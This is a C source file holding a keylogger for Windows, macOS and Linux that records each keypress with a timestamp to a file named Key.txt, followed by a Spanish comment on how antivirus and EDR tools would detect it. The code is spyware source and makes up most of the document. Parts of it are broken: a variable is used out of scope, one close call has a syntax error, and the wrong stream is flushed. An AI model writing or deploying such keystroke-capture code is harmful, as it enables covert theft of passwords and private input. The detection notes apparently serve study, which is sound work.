#include <stdlib.h>
#include <stdio.h>
#include <time.h>
//#include <uiohook.h>

#if defined(_WIN32) || defined(_WIN64)
    #include <windows.h>

    int main() {
        FILE *fptr;
        fptr = fopen("Key.txt", "w");
        while (1) {
            for (int i = 0; i < 256; i++) {
                if (GetAsyncKeyState(i) & 0x8000) {
                    time_t t = time(NULL);
                    struct tm *tlocal = localtime(&t);

                    fprintf(fptr, "%04d/%02d/%02d - %02d:%02d:%02d:  %d\n",
                        tlocal->tm_year + 1900,
                        tlocal->tm_mon + 1,
                        tlocal->tm_mday,
                        tlocal->tm_hour,
                        tlocal->tm_min,
                        tlocal->tm_sec,
                        i);
                    fflush(stdout);
                }
            }
            Sleep(100);
        }
        fclose(fptr);
        return 0;
    }

#elif defined(__APPLE__)
    #include <CoreGraphics/CoreGraphics.h>

    CGEventRef eventTapCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
        if (type == kCGEventKeyDown) {
            time_t t = time(NULL);
            struct tm *tlocal = localtime(&t);

            CGKeyCode keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
            fprintf(fptr, "%04d/%02d/%02d - %02d:%02d:%02d:  %d\n",
            tlocal->tm_year + 1900,
            tlocal->tm_mon + 1,
            tlocal->tm_mday,
            tlocal->tm_hour,
            tlocal->tm_min,
            tlocal->tm_sec,
            keyCode);
            fflush(stdout);
            return event;
        } else {
            fclose(fptr);
        }
    }

    int main() {
        FILE *fptr;
        fptr = fopen("Key.txt", "w");

        CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown),
        eventTapCallback,
        NULL);

        if (!eventTap) {
            printf("Error: You need to grant Accessibility permissions\n");
            printf("Go to System Preferences > Security & Privacy > Accessibility\n");
            return 1;
        }

        CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), source, kCFRunLoopCommonModes);
        CFRunLoopRun();
        return 0;
    }

#elif defined(__linux__)
    #include <fcntl.h>
    #include <unistd.h>
    #include <linux/input.h>

    int main() {
        FILE *fptr;
        fptr = fopen("Key.txt", "w");

        int fd = open("/dev/input/event0", O_RDONLY);
        if (fd < 0) {
            printf("Error: You need to be root (run with: sudo ./program)\n");
            return 1;
        }

        struct input_event ev;
        while (read(fd, &ev, sizeof(ev)) > 0) {
            if (ev.type == EV_KEY && ev.value == 1) {
                time_t t = time(NULL);
                struct tm *tlocal = localtime(&t);

                fprintf(fptr, "%04d/%02d/%02d - %02d:%02d:%02d:  %d\n",
                    tlocal->tm_year + 1900,
                    tlocal->tm_mon + 1,
                    tlocal->tm_mday,
                    tlocal->tm_hour,
                    tlocal->tm_min,
                    tlocal->tm_sec,
                    ev.code);
                fflush(stdout);
            }
        }
        fclose(fptr;)
        close(fd);
        return 0;
    }
#else
    int main() {
        printf("Unsupported operating system\n");
        return 1;
    }
#endif

/*Los antivirus (AV) y sistemas de respuesta ante incidentes (EDR) detectarían este código mediante tres mecanismos principales, 
dependiendo de si analizan el archivo antes de ejecutarse o mientras está funcionando:

1. Análisis Estático (Antes de la ejecución)
El antivirus escanea el archivo ejecutable (.exe, .app o binario de Linux) buscando patrones sospechosos:
Firmas de Funciones API: En Windows, el uso de GetAsyncKeyState junto con un bucle infinito es una "bandera roja" inmediata. 
Los AV tienen bases de datos que marcan esta combinación como característica de malware tipo spyware.
Heurística de Código: Aunque el código sea nuevo y no tenga una firma conocida, los motores heurísticos analizan la estructura. 
Ver que un programa pequeño solicita acceso a /dev/input/event0 (Linux) o usa CGEventTap (macOS) sin una razón legítima (como no 
ser un driver de teclado) activará una alerta. 

2. Análisis Dinámico o de Comportamiento (Durante la ejecución)
Esta es la capa más efectiva en 2025. El sistema monitorea qué hace el programa mientras corre:
Monitoreo de Eventos (ETW): Windows utiliza el Event Tracing for Windows para vigilar llamadas a APIs críticas. Si un proceso en 
segundo plano llama constantemente a GetAsyncKeyState (polling) cientos de veces por segundo, se clasifica como comportamiento 
de keylogger.
Sandboxing: Al intentar ejecutarlo, el AV puede "detonarlo" primero en un entorno virtual seguro para observar si registra 
pulsaciones de teclado antes de permitirle ejecutarse en el sistema real.
Detección de Hooks: Los EDR modernos detectan cuando un programa intenta interceptar la cadena de entrada del sistema (como 
el EventTap en Mac), bloqueando la acción si el software no está firmado por un desarrollador confiable. 

3. Alertas por Privilegios y Permisos
El sistema operativo mismo actúa como primera barrera:
macOS: El código fallará y mostrará un error a menos que el usuario vaya manualmente a Privacidad y Seguridad > Accesibilidad 
para permitirlo, lo cual es una señal de alerta para cualquier usuario.
Linux: El acceso a /dev/input/ requiere privilegios de root. Ejecutar un programa desconocido con sudo es detectado por 
herramientas de auditoría de seguridad como comportamiento de alto riesgo. 

En resumen: Un antivirus moderno como Microsoft Defender o Malwarebytes bloqueará el ejecutable casi instantáneamente al 
detectar la combinación de entrada de bajo nivel + ejecución en segundo plano.*/